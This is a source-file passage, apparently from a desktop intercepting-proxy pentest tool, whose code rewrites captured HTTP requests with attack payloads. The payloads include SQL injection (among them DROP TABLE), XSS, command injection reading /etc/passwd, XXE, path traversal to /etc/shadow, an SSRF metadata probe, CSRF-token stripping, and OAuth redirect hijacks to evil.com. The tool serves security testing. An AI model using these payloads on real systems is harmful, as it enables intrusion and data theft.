        const attackerEmail = attackConfig.emailSwap || 'attacker@evil.com';
        if (body.startsWith('{')) {
          try {
            const obj = JSON.parse(body);
            let changed = false;
            for (const key of Object.keys(obj)) {
              if (typeof obj[key] === 'string' && /[a-z0-9._-]+@[a-z0-9._-]+\.[a-z]{2,}/i.test(obj[key])) {
                obj[key] = [obj[key], attackerEmail];
                changed = true;
              }
            }
            if (changed) {
              const newBody = JSON.stringify(obj, null, 2);
              const newHdr = hdr.split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n') + `\r\nContent-Length: ${new TextEncoder().encode(newBody).length}`;
              setEditedRaw(newHdr + '\r\n\r\n' + newBody); setEditedHeaders(newHdr + '\r\n\r\n' + newBody); setEditorTab('raw');
              addToast({ title: 'Array Injected', message: `Email fields converted to arrays.`, type: 'success' });
            } else addToast({ title: 'No email fields', message: 'No email fields found in JSON.', type: 'warning' });
          } catch { addToast({ title: 'Parse Error', message: 'Invalid JSON body.', type: 'error' }); }
        } else {
          const newBody = body.replace(/([^&=]+)=([^&]*@[^&]*)/g, (_m, k, v) => `${k}=${v}&${k}=${encodeURIComponent(attackerEmail)}`);
          if (newBody !== body) {
            setEditedRaw(hdr + '\r\n\r\n' + newBody); setEditedHeaders(hdr + '\r\n\r\n' + newBody); setEditorTab('raw');
            addToast({ title: 'Array Injected', message: 'Email params duplicated.', type: 'success' });
          } else addToast({ title: 'No email params', message: 'No email values found.', type: 'warning' });
        }
        break;
      }
      case 'csrfRemoval': {
        let newRaw = editedRaw;
        newRaw = newRaw.replace(/^(x-csrf-token|x-xsrf-token|csrf-token|x-requested-with):.*\r?\n/gim, '');
        newRaw = newRaw.replace(/[&]?(csrf[_-]?token|_token|authenticity_token|__RequestVerificationToken|csrfmiddlewaretoken|_csrf|xsrf)=[^&\r\n]*/gi, '');
        newRaw = newRaw.replace(/"(csrf[_-]?token|_token|authenticity_token|_csrf|xsrf)"\s*:\s*"[^"]*",?/gi, '');
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'CSRF Stripped', message: 'All CSRF tokens removed.', type: 'success' }); }
        else addToast({ title: 'No CSRF', message: 'No CSRF tokens found.', type: 'warning' });
        break;
      }
      case 'ipSpoofing': {
        const ip = attackConfig.ipSpoofIp;
        const spoofHeaders = [`X-Forwarded-For: ${ip}`,`X-Real-IP: ${ip}`,`X-Originating-IP: ${ip}`,`X-Client-IP: ${ip}`,`X-Remote-IP: ${ip}`,`X-Remote-Addr: ${ip}`,`True-Client-IP: ${ip}`,`CF-Connecting-IP: ${ip}`];
        const lines = editedRaw.split('\n');
        const rest = lines.slice(1).filter(l => { const lw = l.toLowerCase(); return !lw.startsWith('x-forwarded-for:') && !lw.startsWith('x-real-ip:') && !lw.startsWith('true-client-ip:') && !lw.startsWith('cf-connecting-ip:'); });
        const hEnd = rest.findIndex(l => l.trim() === '' || l.trim() === '\r');
        if (hEnd >= 0) rest.splice(hEnd, 0, ...spoofHeaders.map(h => h + '\r'));
        else rest.push(...spoofHeaders.map(h => h + '\r'));
        const newRaw = lines[0] + '\n' + rest.join('\n');
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'IP Spoofed', message: `8 headers added.`, type: 'success' });
        break;
      }
      case 'hostHeaderInjection': {
        const host = attackConfig.hostInject;
        const newRaw = editedRaw.replace(/^(Host:\s*)(.*)$/im, `$1${host}\r\nX-Forwarded-Host: ${host}\r\nX-Host: ${host}`);
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'Host Injected', message: `Host → ${host}`, type: 'success' }); }
        else addToast({ title: 'No Host', message: 'No Host header found.', type: 'warning' });
        break;
      }
      case 'prototypePollution': {
        const bodyStart = editedRaw.indexOf('\r\n\r\n');
        if (bodyStart < 0) { addToast({ title: 'No body', message: 'No JSON body.', type: 'warning' }); return; }
        try {
          const obj = JSON.parse(editedRaw.slice(bodyStart + 4).trim());
          obj['__proto__'] = { isAdmin: true, role: 'admin' };
          obj['constructor'] = { prototype: { isAdmin: true } };
          const newBody = JSON.stringify(obj, null, 2);
          let hdr = editedRaw.slice(0, bodyStart).split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n');
          hdr += `\r\nContent-Length: ${new TextEncoder().encode(newBody).length}`;
          setEditedRaw(hdr + '\r\n\r\n' + newBody); setEditedHeaders(hdr + '\r\n\r\n' + newBody); setEditorTab('raw');
          addToast({ title: 'Proto Pollution', message: '__proto__ injected.', type: 'success' });
        } catch { addToast({ title: 'Parse Error', message: 'Invalid JSON.', type: 'error' }); }
        break;
      }
      case 'contentTypeConverter': {
        const bodyStart = editedRaw.indexOf('\r\n\r\n');
        if (bodyStart < 0) { addToast({ title: 'No body', message: 'No request body found.', type: 'warning' }); break; }
        const headerPart = editedRaw.slice(0, bodyStart);
        const body = editedRaw.slice(bodyStart + 4).trim();
        const isJson = headerPart.toLowerCase().includes('application/json') || body.startsWith('{');
        const isForm = headerPart.toLowerCase().includes('urlencoded') || (!isJson && body.includes('='));

        if (isForm && !isJson) {
          try {
            const obj: Record<string, string> = {};
            body.split('&').forEach(pair => {
              const [k, ...vParts] = pair.split('=');
              if (k) obj[decodeURIComponent(k)] = decodeURIComponent(vParts.join('=') || '');
            });
            const jsonBody = JSON.stringify(obj, null, 2);
            let newHdr = headerPart.replace(/Content-Type:[^\r\n]*/i, 'Content-Type: application/json');
            newHdr = newHdr.split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n');
            newHdr += `\r\nContent-Length: ${new TextEncoder().encode(jsonBody).length}`;
            setEditedRaw(newHdr + '\r\n\r\n' + jsonBody); setEditedHeaders(newHdr + '\r\n\r\n' + jsonBody); setEditorTab('raw');
            addToast({ title: 'Form → JSON', message: `Converted ${Object.keys(obj).length} params to JSON.`, type: 'success' });
          } catch { addToast({ title: 'Error', message: 'Failed to parse form body.', type: 'error' }); }
        } else if (isJson) {
          try {
            const obj = JSON.parse(body);
            const formBody = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&');
            let newHdr = headerPart.replace(/Content-Type:[^\r\n]*/i, 'Content-Type: application/x-www-form-urlencoded');
            newHdr = newHdr.split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n');
            newHdr += `\r\nContent-Length: ${formBody.length}`;
            setEditedRaw(newHdr + '\r\n\r\n' + formBody); setEditedHeaders(newHdr + '\r\n\r\n' + formBody); setEditorTab('raw');
            addToast({ title: 'JSON → Form', message: `Converted to URL-encoded form data.`, type: 'success' });
          } catch { addToast({ title: 'Error', message: 'Failed to parse JSON body.', type: 'error' }); }
        } else {
          addToast({ title: 'No body', message: 'Body is neither form nor JSON.', type: 'warning' });
        }
        break;
      }
      case 'sqli': {
        const payload = attackConfig.sqliPayload || "' OR '1'='1";
        const newRaw = editedRaw.replace(/([=])([^&\r\n\s]+)/g, `$1$2${encodeURIComponent(payload)}`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'SQLi Injected', message: `Payload: ${payload}`, type: 'success' });
        break;
      }
      case 'xss': {
        const payload = attackConfig.xssPayload || '<script>alert(1)</script>';
        const newRaw = editedRaw.replace(/([=])([^&\r\n\s]+)/g, `$1${encodeURIComponent(payload)}`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'XSS Injected', message: `Payload appended to params.`, type: 'success' });
        break;
      }
      case 'ssti': {
        const payload = attackConfig.sstiPayload || '{{7*7}}';
        const newRaw = editedRaw.replace(/([=])([^&\r\n\s]+)/g, `$1${encodeURIComponent(payload)}`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'SSTI Injected', message: `Check response for 49`, type: 'success' });
        break;
      }
      case 'cmdi': {
        const payload = attackConfig.cmdiPayload || '; id';
        const newRaw = editedRaw.replace(/([=])([^&\r\n\s]*)/g, `$1$2${encodeURIComponent(payload)}`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'CMDi Injected', message: `Payload: ${payload}`, type: 'success' });
        break;
      }
      case 'crlf': {
        const newRaw = editedRaw.replace(/([=])([^&\r\n\s]+)/g, '$1$2%0d%0aInjected-Header:%20true');
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'CRLF Injected', message: '%0d%0a appended to params.', type: 'success' });
        break;
      }
      case 'xxe': {
        const xxePayload = '<?xml version="1.0"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>';
        const bStart = editedRaw.indexOf('\r\n\r\n');
        if (bStart >= 0) {
          let hdr = editedRaw.slice(0, bStart).replace(/Content-Type:[^\r\n]*/i, 'Content-Type: application/xml');
          hdr = hdr.split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n');
          hdr += `\r\nContent-Length: ${xxePayload.length}`;
          setEditedRaw(hdr + '\r\n\r\n' + xxePayload); setEditedHeaders(hdr); setEditorTab('raw');
          addToast({ title: 'XXE Injected', message: 'XML entity payload set.', type: 'success' });
        } else addToast({ title: 'No body', message: 'Add body section first.', type: 'warning' });
        break;
      }
      case 'hpp': {
        const param = attackConfig.hppParam || 'id';
        const newRaw = editedRaw.replace(new RegExp(`(${param}=[^&\\r\\n\\s]+)`, 'g'), `$1&${param}=INJECTED`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'HPP Applied', message: `Duplicate ${param} param added.`, type: 'success' });
        break;
      }
      case 'jsonDupeKeys': {
        const key = attackConfig.dupeKeyName || 'role';
        const val = attackConfig.dupeKeyValue || 'admin';
        const bStart = editedRaw.indexOf('\r\n\r\n');
        if (bStart >= 0) {
          let body = editedRaw.slice(bStart + 4).trim();
          if (body.endsWith('}')) {
            body = body.slice(0, -1) + `, "${key}": "${val}"}`;
            const hdr = editedRaw.slice(0, bStart).split('\n').filter(l => !l.toLowerCase().replace(/\r/g,'').startsWith('content-length:')).join('\n') + `\r\nContent-Length: ${body.length}`;
            setEditedRaw(hdr + '\r\n\r\n' + body); setEditedHeaders(hdr); setEditorTab('raw');
            addToast({ title: 'Dupe Key', message: `Added duplicate "${key}"`, type: 'success' });
          }
        }
        break;
      }
      case 'pathTraversal': {
        const payload = attackConfig.lfiPayload || '../../../etc/passwd';
        const urlParams = /(([?&])(file|path|page|template|include|doc|dir|folder|load|read|fetch)=)([^&\s]*)/gi;
        const newRaw = editedRaw.replace(urlParams, `$1${encodeURIComponent(payload)}`);
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'LFI Injected', message: `Payload: ${payload}`, type: 'success' }); }
        else addToast({ title: 'No file param', message: 'No file/path/page params found.', type: 'warning' });
        break;
      }
      case 'openRedirect': {
        const target = attackConfig.redirectUrl || 'https://evil.com';
        const urlParams = /(([?&])(redirect|redirect_uri|callback|return_url|return|next|goto|continue|dest|url)=)([^&\s]*)/gi;
        const newRaw = editedRaw.replace(urlParams, `$1${encodeURIComponent(target)}`);
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'Redirect Set', message: `→ ${target}`, type: 'success' }); }
        else addToast({ title: 'No redirect param', message: 'No redirect/callback/next params.', type: 'warning' });
        break;
      }
      case 'oauthRedirect': {
        const target = attackConfig.oauthUrl || 'https://evil.com/callback';
        const newRaw = editedRaw.replace(/(redirect_uri=)([^&\s]*)/gi, `$1${encodeURIComponent(target)}`);
        if (newRaw !== editedRaw) { setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'OAuth Hijack', message: `redirect_uri → ${target}`, type: 'success' }); }
        else addToast({ title: 'No redirect_uri', message: 'No OAuth redirect_uri found.', type: 'warning' });
        break;
      }
      case 'bypass403path': {
        const path = attackConfig.bypassPath || '/admin';
        addToast({ title: '403 Bypass', message: `Try: ${path}/, ${path}/., /${path}/../${path}, /%2e/${path}`, type: 'info' });
        setExpandedAttack(id);
        break;
      }
      case 'bypass403headers': {
        const lines = editedRaw.split('\n');
        const rest = lines.slice(1);
        const hEnd = rest.findIndex(l => l.trim() === '' || l.trim() === '\r');
        const bypassHeaders = ['X-Original-URL: /admin\r', 'X-Rewrite-URL: /admin\r', 'X-Custom-IP-Authorization: 127.0.0.1\r', 'X-Forwarded-For: 127.0.0.1\r', 'X-Real-IP: 127.0.0.1\r'];
        if (hEnd >= 0) rest.splice(hEnd, 0, ...bypassHeaders);
        else rest.push(...bypassHeaders);
        const newRaw = lines[0] + '\n' + rest.join('\n');
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: '403 Bypass', message: '5 bypass headers injected.', type: 'success' });
        break;
      }
      case 'methodOverride': {
        const method = attackConfig.overrideMethod || 'DELETE';
        const lines = editedRaw.split('\n');
        const rest = lines.slice(1);
        const hEnd = rest.findIndex(l => l.trim() === '' || l.trim() === '\r');
        const overrideHeaders = [`X-HTTP-Method-Override: ${method}\r`, `X-Method-Override: ${method}\r`];
        if (hEnd >= 0) rest.splice(hEnd, 0, ...overrideHeaders);
        else rest.push(...overrideHeaders);
        const newRaw = lines[0] + '\n' + rest.join('\n');
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'Override Added', message: `Method override: ${method}`, type: 'success' });
        break;
      }
      case 'corsTest': {
        const origin = attackConfig.corsOrigin || 'https://evil.com';
        const newRaw = editedRaw.replace(/^(Host:[^\r\n]*)/im, `$1\r\nOrigin: ${origin}`);
        setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw');
        addToast({ title: 'CORS Test', message: `Origin: ${origin} — check ACAO in response`, type: 'success' });
        break;
      }
      case 'clickjacking': {
        addToast({ title: 'Clickjacking', message: 'Check response for X-Frame-Options / CSP frame-ancestors headers.', type: 'info' });
        break;
      }
      default:
        setExpandedAttack(id);
        addToast({ title: 'Configure', message: `Expand ${id} to configure.`, type: 'info' });
    }
  }

  function renderConfig(id: string) {
    switch (id) {
      case 'jsonArrayInjection':
        return (<>
          <input className="intercept-attack-input" value={attackConfig.emailSwap} onChange={e => setAttackConfig({...attackConfig, emailSwap: e.target.value})} placeholder="Attacker email" />
          <span className="intercept-config-hint">Converts email fields to arrays: ["victim", "attacker"]</span>
        </>);
      case 'emailSwap':
        return <input className="intercept-attack-input" value={attackConfig.emailSwap} onChange={e => setAttackConfig({...attackConfig, emailSwap: e.target.value})} placeholder="attacker@evil.com" />;
      case 'roleEscalation':
        return (<>
          <input className="intercept-attack-input" value={attackConfig.roleKey} onChange={e => setAttackConfig({...attackConfig, roleKey: e.target.value})} placeholder="Key (isAdmin)" />
          <input className="intercept-attack-input" value={attackConfig.roleValue} onChange={e => setAttackConfig({...attackConfig, roleValue: e.target.value})} placeholder="Value (true)" />
        </>);
      case 'tokenTamper':
        return (
          <select className="intercept-attack-input" value={attackConfig.tokenAction} onChange={e => setAttackConfig({...attackConfig, tokenAction: e.target.value})}>
            <option value="tamper">Flip 1 char</option><option value="remove">Remove header</option><option value="empty">Empty string</option><option value="algnone">JWT alg:none</option>
          </select>
        );
      case 'ipSpoofing':
        return <input className="intercept-attack-input" value={attackConfig.ipSpoofIp} onChange={e => setAttackConfig({...attackConfig, ipSpoofIp: e.target.value})} placeholder="127.0.0.1" />;
      case 'hostHeaderInjection':
        return <input className="intercept-attack-input" value={attackConfig.hostInject} onChange={e => setAttackConfig({...attackConfig, hostInject: e.target.value})} placeholder="evil.com" />;
      case 'ssrfProbe':
        return <input className="intercept-attack-input" value={attackConfig.ssrfUrl} onChange={e => setAttackConfig({...attackConfig, ssrfUrl: e.target.value})} placeholder="http://169.254.169.254/..." />;
      case 'massAssignment':
        return <input className="intercept-attack-input" value={attackConfig.massAssignFields} onChange={e => setAttackConfig({...attackConfig, massAssignFields: e.target.value})} placeholder="isAdmin=true, role=admin" />;
      case 'idorFuzz':
        return (<>
          <input className="intercept-attack-input" value={attackConfig.idorParam} onChange={e => setAttackConfig({...attackConfig, idorParam: e.target.value})} placeholder="id" />
          <select className="intercept-attack-input" value={attackConfig.idorAction} onChange={e => setAttackConfig({...attackConfig, idorAction: e.target.value})}>
            <option value="random">Random</option><option value="zero">0</option><option value="one">1</option><option value="negative">-1</option><option value="max">999999999</option>
          </select>
        </>);
      case 'methodSwap':
        return (
          <select className="intercept-attack-input" onChange={e => { if (!e.target.value) return; const newRaw = editedRaw.replace(/^(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s/i, e.target.value + ' '); setEditedRaw(newRaw); setEditedHeaders(newRaw); setEditorTab('raw'); addToast({ title: 'Method Changed', message: `→ ${e.target.value}`, type: 'success' }); }}>
            <option value="">Select…</option><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>PATCH</option><option>OPTIONS</option>
          </select>
        );
      case 'sqli':
        return (
          <select className="intercept-attack-input" value={attackConfig.sqliPayload || "' OR '1'='1"} onChange={e => setAttackConfig({...attackConfig, sqliPayload: e.target.value})}>
            <option value="' OR '1'='1">Basic OR bypass</option>
            <option value="' UNION SELECT NULL--">UNION SELECT</option>
            <option value="' AND SLEEP(5)--">Time-based blind</option>
            <option value="1' ORDER BY 1--">ORDER BY enum</option>
            <option value="'; DROP TABLE users--">DROP TABLE (demo)</option>
          </select>
        );
      case 'xss':
        return (
          <select className="intercept-attack-input" value={attackConfig.xssPayload || '<script>alert(1)</script>'} onChange={e => setAttackConfig({...attackConfig, xssPayload: e.target.value})}>
            <option value="<script>alert(1)</script>">Script tag</option>
            <option value='"><img src=x onerror=alert(1)>'>Img onerror</option>
            <option value="javascript:alert(1)">JS protocol</option>
            <option value="<svg onload=alert(1)>">SVG onload</option>
          </select>
        );
      case 'ssti':
        return (
          <select className="intercept-attack-input" value={attackConfig.sstiPayload || '{{7*7}}'} onChange={e => setAttackConfig({...attackConfig, sstiPayload: e.target.value})}>
            <option value="{'{{7*7}}'}">{'{'}{'{'} 7*7 {'}'}{'}'}  Jinja2/Twig</option>
            <option value="${'${7*7}'}">${'{'}7*7{'}'} Freemarker</option>
            <option value="<%= 7*7 %>">{'<%= 7*7 %>'} ERB</option>
            <option value="#{'#{7*7}'}">#{'{}'}7*7{'}'} Pebble</option>
          </select>
        );
      case 'cmdi':
        return (
          <select className="intercept-attack-input" value={attackConfig.cmdiPayload || '; id'} onChange={e => setAttackConfig({...attackConfig, cmdiPayload: e.target.value})}>
            <option value="; id">; id</option>
            <option value="| whoami">| whoami</option>
            <option value="$(cat /etc/passwd)">$(cat /etc/passwd)</option>
            <option value="& dir">& dir (Windows)</option>
            <option value="|| ping -c 1 127.0.0.1">|| ping (blind)</option>
          </select>
        );
      case 'hpp':
        return <input className="intercept-attack-input" value={attackConfig.hppParam || 'id'} onChange={e => setAttackConfig({...attackConfig, hppParam: e.target.value})} placeholder="Param to duplicate" />;
      case 'jsonDupeKeys':
        return (<>
          <input className="intercept-attack-input" value={attackConfig.dupeKeyName || 'role'} onChange={e => setAttackConfig({...attackConfig, dupeKeyName: e.target.value})} placeholder="Key" />
          <input className="intercept-attack-input" value={attackConfig.dupeKeyValue || 'admin'} onChange={e => setAttackConfig({...attackConfig, dupeKeyValue: e.target.value})} placeholder="Value" />
        </>);
      case 'pathTraversal':
        return (
          <select className="intercept-attack-input" value={attackConfig.lfiPayload || '../../../etc/passwd'} onChange={e => setAttackConfig({...attackConfig, lfiPayload: e.target.value})}>
            <option value="../../../etc/passwd">../../../etc/passwd</option>
            <option value="..\\..\\..\\windows\\system32\\drivers\\etc\\hosts">..\..\hosts (Win)</option>
            <option value="....//....//....//etc/passwd">....// bypass</option>
            <option value="/etc/shadow">/etc/shadow</option>
          </select>
        );
      case 'openRedirect':
        return <input className="intercept-attack-input" value={attackConfig.redirectUrl || 'https://evil.com'} onChange={e => setAttackConfig({...attackConfig, redirectUrl: e.target.value})} placeholder="https://evil.com" />;
      case 'oauthRedirect':
        return <input className="intercept-attack-input" value={attackConfig.oauthUrl || 'https://evil.com/callback'} onChange={e => setAttackConfig({...attackConfig, oauthUrl: e.target.value})} placeholder="https://evil.com/callback" />;
      case 'bypass403path':
        return <input className="intercept-attack-input" value={attackConfig.bypassPath || '/admin'} onChange={e => setAttackConfig({...attackConfig, bypassPath: e.target.value})} placeholder="/admin" />;
      case 'methodOverride':
        return (
          <select className="intercept-attack-input" value={attackConfig.overrideMethod || 'DELETE'} onChange={e => setAttackConfig({...attackConfig, overrideMethod: e.target.value})}>
            <option>DELETE</option><option>PUT</option><option>PATCH</option><option>OPTIONS</option>
          </select>
        );
      case 'corsTest':
        return <input className="intercept-attack-input" value={attackConfig.corsOrigin || 'https://evil.com'} onChange={e => setAttackConfig({...attackConfig, corsOrigin: e.target.value})} placeholder="https://evil.com" />;
      default: return <span className="intercept-config-hint">No config needed — click Run to apply.</span>;
    }
  }
}

export function Intercept() {
  const [interceptOn, setInterceptOn] = useState(false);
  const [responseInterceptOn, setResponseInterceptOn] = useState(false);
  const [proxyRunning, setProxyRunning] = useState(false);
  const [editorTab, setEditorTab] = useState<'raw' | 'headers' | 'params' | 'json' | 'hex' | 'attack' | 'response'>('raw');
  const [queue, setQueue] = useState<QueuedRequest[]>([]);
  const [current, setCurrent] = useState<QueuedRequest | null>(null);
  const [lastForwarded, setLastForwarded] = useState<QueuedRequest | null>(null);
  const [editedRaw, setEditedRaw] = useState('');
  const [editedHeaders, setEditedHeaders] = useState<ParsedHeader[]>([]);
  const [editedParams, setEditedParams] = useState<ParsedParam[]>([]);
  const [totalRequests, setTotalRequests] = useState(0);
  const { openContextMenu, addToast } = useAppStore();
  
  const [attackConfig, setAttackConfig] = useState({
    emailSwap: 'attacker@evil.com',
    roleKey: 'isAdmin',
    roleValue: 'true',
    tokenAction: 'tamper', 
    ipSpoofIp: '127.0.0.1',
    idorAction: 'random',
    idorParam: 'id',
    contentType: 'application/json',
    ssrfUrl: 'http://169.254.169.254/latest/meta-data/',
    ssrfParam: 'url',
    massAssignFields: 'isAdmin=true, role=admin, verified=true',
    hostInject: 'evil.com',
    protoPayload: '{"__proto__":{"isAdmin":true}}',
  });

  const [attackCategoryFilter, setAttackCategoryFilter] = useState<string>('all');
  const [expandedAttack, setExpandedAttack] = useState<string | null>(null);
  const [autoScanRunning, setAutoScanRunning] = useState(false);
  const [scanResults, setScanResults] = useState<{id: string; name: string; status: 'success'|'fail'|'pending'|'skipped'; detail: string}[]>([]);
  const [responseRaw, setResponseRaw] = useState<string>('');

  const detectApplicableAttacks = useCallback((raw: string, url: string): Record<string, boolean> => {
    if (!raw) return {};
    const lower = raw.toLowerCase();
    const bodyStart = raw.indexOf('\r\n\r\n');
    const body = bodyStart > 0 ? raw.slice(bodyStart + 4).trim() : '';

    const hasJson = lower.includes('content-type: application/json') || body.startsWith('{') || body.startsWith('[');
    const hasForm = lower.includes('content-type: application/x-www-form-urlencoded') || (!hasJson && body.includes('=') && body.includes('&'));
    const hasAuth = lower.includes('authorization:') || lower.includes('bearer ');
    const hasJwt = raw.includes('eyJ') && raw.split('.').length >= 3;
    const hasCsrf = lower.includes('csrf') || lower.includes('_token') || lower.includes('x-csrf') || lower.includes('xsrf') || lower.includes('authenticity_token');
    const hasEmail = /[a-z0-9._-]+@[a-z0-9._-]+\.[a-z]{2,}/i.test(raw);
    const hasUrlParam = /[?&](url|redirect|next|return|callback|dest|goto|link|uri|path|file|page)=/i.test(url + '\n' + body);
    const hasIdParam = /[?&](id|user_id|account_id|uid|pid|order_id|item_id)=\d+/i.test(url + '\n' + body);
    const hasRoleField = /"?(role|isAdmin|is_admin|admin|permission|access_level|privilege|group)"?\s*[:=]/i.test(body);

    const hasHostHeader = lower.includes('host:');

    const hasParams = body.includes('=') || url.includes('?');
    const hasXml = lower.includes('content-type: application/xml') || lower.includes('content-type: text/xml') || body.trim().startsWith('<');
    const hasRedirectParam = /[?&](redirect|redirect_uri|callback|return_url|return|next|goto|continue|dest|url)=/i.test(url + '\n' + body);
    const hasFileParam = /[?&](file|path|page|template|include|doc|dir|folder|load|read|fetch)=/i.test(url + '\n' + body);
    const hasCmdParam = /[?&](cmd|exec|command|run|shell|process|ping|query|search|input)=/i.test(url + '\n' + body);
    const hasOAuth = /redirect_uri=/i.test(url + '\n' + body);

    return {
      emailSwap: hasEmail,
      roleEscalation: hasRoleField || hasJson,
      tokenTamper: hasAuth || hasJwt,
      idorFuzz: hasIdParam,
      methodSwap: true,
      contentTypeConverter: hasForm || hasJson,
      jsonArrayInjection: (hasJson || hasForm) && hasEmail,
      ipSpoofing: true,
      csrfRemoval: hasCsrf,
      hostHeaderInjection: hasHostHeader,
      massAssignment: hasJson,
      ssrfProbe: hasUrlParam,
      prototypePollution: hasJson,
      sqli: hasParams || hasForm,
      xss: hasParams || hasForm,
      ssti: hasParams || hasForm,
      cmdi: hasCmdParam,
      crlf: hasParams,
      xxe: hasXml || hasForm, // can convert form→xml
      hpp: hasParams,
      jsonDupeKeys: hasJson,
      pathTraversal: hasFileParam,
      oauthRedirect: hasOAuth,
      bypass403path: true,
      bypass403headers: true,
      methodOverride: true,
      corsTest: true,
      openRedirect: hasRedirectParam,
      clickjacking: true, // always check response
    };
  }, []);

  const detectedAttacks = current ? detectApplicableAttacks(editedRaw, current.url) : {};

  const preRef = useRef<HTMLPreElement>(null);


  useEffect(() => {
    let unlisten: (() => void) | undefined;
    (async () => {
      try {
        const { listen } = await import('@tauri-apps/api/event');
        unlisten = await listen<any>('proxy-event', (event) => {
          const data = event.payload;
          if (data.type === 'intercept') {
            const item = data.item;
            const req: QueuedRequest = {
              id: item.id, method: item.method, url: item.url, host: item.host,
              raw: item.is_response ? (item.raw_response || '') : item.raw_request,
              timestamp: item.timestamp,
              isResponse: item.is_response || false,
              status: item.status,
              rawResponse: item.raw_response,
            };
            if (item.is_response && item.raw_response) {
              setQueue((q) => {
                const existing = q.find(r => r.url === item.url && !r.rawResponse);
                if (existing) {
                  return q.map(r => r.id === existing.id ? { ...r, rawResponse: item.raw_response, status: item.status } : r);
                }
                return [...q, req];
              });
              setResponseRaw(item.raw_response);
            } else {
              setQueue((q) => [...q, req]);
            }
          } else if (data.type === 'intercept_resolved') {
            if (data.response || data.raw_response) {
              const resp = data.response || data.raw_response;
              setResponseRaw(resp);
              setQueue((q) => q.map(r => r.id === data.id ? { ...r, rawResponse: resp, status: data.status } : r));
            }
            setQueue((q) => q.filter((r) => r.id !== data.id));
          } else if (data.type === 'traffic') {
            setTotalRequests((n) => n + 1);
            if (data.item?.raw_response) {
              setResponseRaw(data.item.raw_response);
            }
          }
        });
      } catch {}
    })();
    return () => { unlisten?.(); };
  }, []);


  useEffect(() => {
    if (!current && queue.length > 0) {
      selectItem(queue[0]);
    }
  }, [queue, current]);

  const selectItem = (item: QueuedRequest) => {
    const prettied = autoPrettyJsonBody(item.raw);
    setCurrent(item);
    setLastForwarded(null); // clear lastForwarded when selecting a new item
    setEditedRaw(prettied);
    setEditedHeaders(parseHeaders(prettied));
    setEditedParams(parseParams(prettied, item.url));
    setResponseRaw(item.rawResponse || '');
  };


  const rebuildRawFromHeaders = (headers: ParsedHeader[]) => {
    const lines = editedRaw.split('\n');
    const firstLine = lines[0] || '';
    const bodyIdx = editedRaw.indexOf('\r\n\r\n');
    const body = bodyIdx > 0 ? editedRaw.slice(bodyIdx) : '';
    const newRaw = firstLine + '\r\n' + headers.map(h => `${h.key}: ${h.value}`).join('\r\n') + '\r\n' + body;
    setEditedRaw(newRaw);
  };


  useEffect(() => {
    const check = async () => {
      try {
        const { invoke } = await import('@tauri-apps/api/core');
        const status = await invoke<any>('proxy_status');
        setProxyRunning(status.running);
        setInterceptOn(status.intercept_enabled);
        setResponseInterceptOn(status.response_intercept_enabled || false);
        setTotalRequests(status.total_requests);
      } catch {}
    };
    check();
    const interval = setInterval(check, 3000);
    return () => clearInterval(interval);
  }, []);


  const startProxy = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      await invoke('proxy_start', { port: 8080 });
      setProxyRunning(true);
    } catch (e) {
      notifyError('Proxy start failed', e);
    }
  }, []);

  const stopProxy = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      await invoke('proxy_stop');
      setProxyRunning(false);
      setInterceptOn(false);
    } catch (e) {
      notifyError('Proxy stop failed', e);
    }
  }, []);

  const toggleIntercept = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      if (!proxyRunning) await startProxy();
      const next = !interceptOn;
      const result = await invoke<any>('proxy_toggle_intercept', { enabled: next });
      setInterceptOn(next);
      if (!next) {
        // Master off: response intercept is killed server-side, mirror it locally
        // and surface the auto-forwarded count.
        setResponseInterceptOn(false);
        const drained: number = result?.drained ?? 0;
        setQueue([]);
        setCurrent(null);
        if (drained > 0) {
          addToast({
            title: 'Intercept off',
            message: `${drained} pending request${drained === 1 ? '' : 's'} auto-forwarded.`,
            type: 'success',
          });
        } else {
          addToast({ title: 'Intercept off', message: 'Queue was empty.', type: 'info' });
        }
      }
    } catch (e) {
      notifyError('Intercept toggle failed', e);
    }
  }, [interceptOn, proxyRunning, startProxy, addToast]);

  const toggleResponseIntercept = useCallback(async () => {
    try {
      const { invoke } = await import('@tauri-apps/api/core');
      const next = !responseInterceptOn;
